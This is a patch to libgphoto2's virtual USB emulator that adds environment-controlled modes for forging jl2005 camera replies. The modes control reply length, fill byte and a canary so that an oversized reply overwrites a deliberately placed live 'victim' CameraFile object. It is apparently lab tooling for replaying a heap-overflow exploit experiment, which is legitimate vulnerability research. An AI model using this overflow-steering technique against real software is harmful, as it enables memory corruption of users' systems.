@@ -1,0 +1,62 @@
+# W175/W177 local-only vusb diff, relative to the W172 patched plain tree.
+# Apply with `patch -p1` after live/vusb-jl2005.patch,
+# evidence/replay-vusb-victim.patch, evidence/replay-vusb-normal-return.patch
+# and evidence/replay-vusb-guards.patch. Do NOT apply
+# replay-vusb-local-modes.patch: its mode-p cap is already in the victim
+# patch. Adds the W175 short-reply mode-v cap BEFORE the first memset,
+# the total_data_in_camera fixture, the widened mode-v victim condition,
+# and the cap before the fill memset. These four hunks were previously
+# uncommitted, so W175/W177 could not be replayed from a clean archive.
+
+--- a/libgphoto2_port/vusb/vusb.c
++++ b/libgphoto2_port/vusb/vusb.c
+@@ -170,6 +170,10 @@
+ 			bytes[6] = 0x43;
+ 			bytes[12] = (char)((count >> 8) & 0xff);
+ 			bytes[13] = (char)(count & 0xff);
++			if (getenv("M2SHELL_JL2005_TOTAL")) {
++				bytes[8] = 0; bytes[9] = 0;
++				bytes[10] = (char)0xff; bytes[11] = (char)0xff;
++			}
+ 			return size;
+ 		}
+ 		{
+@@ -180,6 +184,13 @@
+ 				int lim = ls ? (int)strtol(ls, NULL, 0) : 0x3E38;
+ 				if (n > lim) n = lim;
+ 			}
++			if (m2[0] == 'v') {
++				const char *lv = getenv("M2SHELL_JL2005_LEN");
++				if (lv) {
++					int limv = (int)strtol(lv, NULL, 0);
++					if (n > limv) n = limv;
++				}
++			}
+ 			memset(bytes, 0x5a, (size_t)n);
+ 			if (m2[0] == 'p') {
+ 				const char *ts = getenv("M2SHELL_JL2005_TOP");
+@@ -208,7 +219,7 @@
+ 			}
+ 			/* W170 lab-only: allocate a live CameraFile immediately after
+ 			 * camera->pl, then let the oversized reply overwrite it. */
+-			if (m2[0] == 'v' && n >= 0x3E40) {
++			if (m2[0] == 'v') {
+ 				void **slot = (void **)dlsym(RTLD_DEFAULT, "m2s_victim_file");
+ 				const char *fs = getenv("M2SHELL_JL2005_FILL");
+ 				const char *ks = getenv("M2SHELL_JL2005_CANARY");
+@@ -247,6 +258,15 @@
+ 								ng, guards[0], guards[ng-1]);
+ 					}
+ 				}
++				{
++					const char *ls2 = getenv("M2SHELL_JL2005_LEN");
++					if (ls2) {
++						int lim2 = (int)strtol(ls2, NULL, 0);
++						if (n > lim2) n = lim2;
++						if (getenv("M2SHELL_DEBUG"))
++							fprintf(stderr, "VUSB_LEN_CAP n=%d lim=%d\n", n, lim2);
++					}
++				}
+ 				memset(bytes, fill, (size_t)n);
+ 				if (ks) {
+ 					unsigned long long v = strtoull(ks, NULL, 0);
